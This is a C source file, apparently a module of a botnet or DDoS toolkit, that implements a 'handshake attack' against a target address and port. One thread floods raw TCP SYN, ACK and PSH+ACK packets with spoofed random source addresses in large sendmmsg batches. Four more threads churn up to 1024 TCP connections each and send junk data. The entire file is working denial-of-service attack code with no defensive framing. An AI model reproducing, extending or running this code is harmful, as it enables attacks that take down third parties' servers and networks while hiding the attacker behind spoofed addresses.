#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>

#include "handshake_attack.h"
#include "../headers/protocol.h"

#define MAX_CONNECTIONS 1024
#define CONNECT_TIMEOUT_MS 30
#define BURST_SIZE 64
#define RAW_BATCH 128

typedef struct {
    int fd;
    uint8_t state;
    time_t created;
} conn_slot;

static inline uint64_t xorshift64(uint64_t *s) {
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    return *s = x;
}

static inline uint32_t rand_ip_fast(uint64_t *rng) {
    uint64_t r = xorshift64(rng);
    return ((r % 223 + 1) << 24) |
           (((r >> 8) % 255) << 16) |
           (((r >> 16) % 255) << 8) |
           (((r >> 24) % 254) + 1);
}

static uint16_t tcp_checksum(struct iphdr* ip, struct tcphdr* tcp, int tcp_len) {
    uint32_t sum = 0;
    uint16_t* ptr;

    sum += (ip->saddr >> 16) & 0xFFFF;
    sum += ip->saddr & 0xFFFF;
    sum += (ip->daddr >> 16) & 0xFFFF;
    sum += ip->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += htons(tcp_len);

    ptr = (uint16_t*)tcp;
    for (int i = 0; i < tcp_len / 2; i++) {
        sum += ptr[i];
    }
    if (tcp_len & 1) {
        sum += ((uint8_t*)tcp)[tcp_len - 1];
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static uint16_t ip_checksum(void* data, int len) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(uint8_t*)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static void* raw_flood_thread(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    int sndbuf = 8 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 16) ^ (uintptr_t)&fd;
    if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;

    attack_option* opt_psize = find_option(params, OPT_PSIZE);
    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 0;
    if (psize > 1400) psize = 1400;

    size_t tcp_opts_len = 20;
    size_t total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opts_len + psize;

    // Pre-allocate batch of packets for sendmmsg
    // Each packet in the batch gets 3 sends (SYN, ACK, PSH+ACK), so we need
    // RAW_BATCH * 3 messages. But since we modify flags in-place, we allocate
    // RAW_BATCH independent packet buffers and send them in 3 passes.
    char (*packets)[600] = malloc(RAW_BATCH * 600);
    if (!packets) {
        close(fd);
        return NULL;
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    // Set up sendmmsg structures
    struct mmsghdr msgs[RAW_BATCH];
    struct iovec iovs[RAW_BATCH];

    for (int i = 0; i < RAW_BATCH; i++) {
        iovs[i].iov_base = packets[i];
        iovs[i].iov_len  = total_len;

        msgs[i].msg_hdr.msg_name       = &dest;
        msgs[i].msg_hdr.msg_namelen    = sizeof(dest);
        msgs[i].msg_hdr.msg_iov        = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen     = 1;
        msgs[i].msg_hdr.msg_control    = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags      = 0;
        msgs[i].msg_len = 0;
    }

    // Initialize all packet buffers with common fields
    for (int i = 0; i < RAW_BATCH; i++) {
        memset(packets[i], 0, total_len);

        struct iphdr* ip = (struct iphdr*)packets[i];
        struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));
        uint8_t* tcp_opts = (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct tcphdr));
        uint8_t* payload = tcp_opts + tcp_opts_len;

        // TCP options: MSS, Window Scale, Timestamps
        tcp_opts[0] = 2; tcp_opts[1] = 4; tcp_opts[2] = 0x05; tcp_opts[3] = 0xB4;
        tcp_opts[4] = 1;
        tcp_opts[5] = 3; tcp_opts[6] = 3; tcp_opts[7] = 8;
        tcp_opts[8] = 1;
        tcp_opts[9] = 1;
        tcp_opts[10] = 8; tcp_opts[11] = 10;
        uint32_t ts = htonl(time(NULL));
        memcpy(tcp_opts + 12, &ts, 4);
        memset(tcp_opts + 16, 0, 4);

        if (psize > 0) {
            for (uint16_t p = 0; p < psize; p++) {
                payload[p] = xorshift64(&rng_state) & 0xFF;
            }
        }

        ip->version = 4;
        ip->ihl = 5;
        ip->tos = 0;
        ip->tot_len = htons(total_len);
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->daddr = params->target_addr.sin_addr.s_addr;

        tcp->dest = params->target_addr.sin_port;
        tcp->doff = (sizeof(struct tcphdr) + tcp_opts_len) / 4;
        tcp->window = htons(64240);
        tcp->urg_ptr = 0;
    }

    time_t end_time = time(NULL) + params->duration;
    uint32_t seq_base = (uint32_t)xorshift64(&rng_state);
    uint64_t iter = 0;

    while (params->active) {
        if ((++iter & 0xFF) == 0 && time(NULL) >= end_time) break;

        // Fill batch with unique SYN packets
        for (int i = 0; i < RAW_BATCH; i++) {
            struct iphdr* ip = (struct iphdr*)packets[i];
            struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));

            uint64_t rv = xorshift64(&rng_state);
            ip->id = htons(rv & 0xFFFF);
            ip->saddr = rand_ip_fast(&rng_state);
            ip->check = 0;
            ip->check = ip_checksum(ip, sizeof(struct iphdr));

            tcp->source = htons(1024 + ((rv >> 16) % 64000));
            tcp->seq = htonl(seq_base++);
            tcp->ack_seq = 0;

            tcp->syn = 1;
            tcp->ack = 0;
            tcp->fin = 0;
            tcp->rst = 0;
            tcp->psh = 0;

            tcp->check = 0;
            tcp->check = tcp_checksum(ip, tcp, sizeof(struct tcphdr) + tcp_opts_len + psize);
        }

        // Send batch of SYN packets
        sendmmsg(fd, msgs, RAW_BATCH, MSG_NOSIGNAL);

        // Convert to ACK packets and send batch
        for (int i = 0; i < RAW_BATCH; i++) {
            struct iphdr* ip = (struct iphdr*)packets[i];
            struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));

            tcp->syn = 0;
            tcp->ack = 1;
            tcp->ack_seq = htonl(xorshift64(&rng_state) & 0xFFFFFFFF);

            tcp->check = 0;
            tcp->check = tcp_checksum(ip, tcp, sizeof(struct tcphdr) + tcp_opts_len + psize);
        }

        sendmmsg(fd, msgs, RAW_BATCH, MSG_NOSIGNAL);

        // Convert to PSH+ACK packets and send batch
        for (int i = 0; i < RAW_BATCH; i++) {
            struct iphdr* ip = (struct iphdr*)packets[i];
            struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));

            tcp->psh = 1;
            tcp->seq = htonl(seq_base++);

            tcp->check = 0;
            tcp->check = tcp_checksum(ip, tcp, sizeof(struct tcphdr) + tcp_opts_len + psize);
        }

        sendmmsg(fd, msgs, RAW_BATCH, MSG_NOSIGNAL);
    }

    free(packets);
    close(fd);
    return NULL;
}

static void* socket_flood_thread(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    conn_slot* slots = (conn_slot*)calloc(MAX_CONNECTIONS, sizeof(conn_slot));
    if (!slots) return NULL;

    struct sockaddr_in target;
    memcpy(&target, &params->target_addr, sizeof(target));

    time_t end_time = time(NULL) + params->duration;
    uint64_t sock_iter = 0;

    while (params->active) {
        if ((++sock_iter & 0xF) == 0 && time(NULL) >= end_time) break;

        // Open connections in bulk
        for (int i = 0; i < MAX_CONNECTIONS && params->active; i++) {
            if (slots[i].fd <= 0) {
                int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
                if (fd < 0) continue;

                int opt = 1;
                setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

                connect(fd, (struct sockaddr*)&target, sizeof(target));

                slots[i].fd = fd;
                slots[i].state = 1;
                slots[i].created = time(NULL);
            }
        }

        struct pollfd pfds[MAX_CONNECTIONS];
        int pfd_map[MAX_CONNECTIONS]; // map pollfd index -> slot index
        int nfds = 0;

        for (int i = 0; i < MAX_CONNECTIONS; i++) {
            if (slots[i].fd > 0) {
                pfds[nfds].fd = slots[i].fd;
                pfds[nfds].events = POLLOUT;
                pfd_map[nfds] = i;
                nfds++;
            }
        }

        if (nfds > 0) {
            poll(pfds, nfds, CONNECT_TIMEOUT_MS);
        }

        // Process results and recycle aggressively
        time_t now = time(NULL);
        for (int j = 0; j < nfds; j++) {
            int i = pfd_map[j];
            if (slots[i].fd <= 0) continue;

            // Recycle after shorter timeout or too many sends
            if (now - slots[i].created > 0 || slots[i].state >= 2) {
                close(slots[i].fd);
                slots[i].fd = 0;
                slots[i].state = 0;
                continue;
            }

            if (pfds[j].revents & POLLOUT) {
                int error = 0;
                socklen_t elen = sizeof(error);
                getsockopt(slots[i].fd, SOL_SOCKET, SO_ERROR, &error, &elen);

                if (error == 0) {
                    char data[64];
                    memset(data, 'X', sizeof(data));
                    send(slots[i].fd, data, sizeof(data), MSG_NOSIGNAL);
                    slots[i].state++;
                } else {
                    // Connection failed, recycle immediately
                    close(slots[i].fd);
                    slots[i].fd = 0;
                    slots[i].state = 0;
                }
            } else if (pfds[j].revents & (POLLERR | POLLHUP)) {
                close(slots[i].fd);
                slots[i].fd = 0;
                slots[i].state = 0;
            }
        }
    }

    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (slots[i].fd > 0) {
            close(slots[i].fd);
        }
    }
    free(slots);
    return NULL;
}

void* handshake_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    pthread_t raw_thread;
    pthread_t sock_threads[4];

    if (pthread_create(&raw_thread, NULL, raw_flood_thread, params) == 0) {
        pthread_detach(raw_thread);
    }

    for (int i = 0; i < 4; i++) {
        if (pthread_create(&sock_threads[i], NULL, socket_flood_thread, params) == 0) {
            pthread_detach(sock_threads[i]);
        }
    }

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && params->active) {
        usleep(100000);
    }

    return NULL;
}
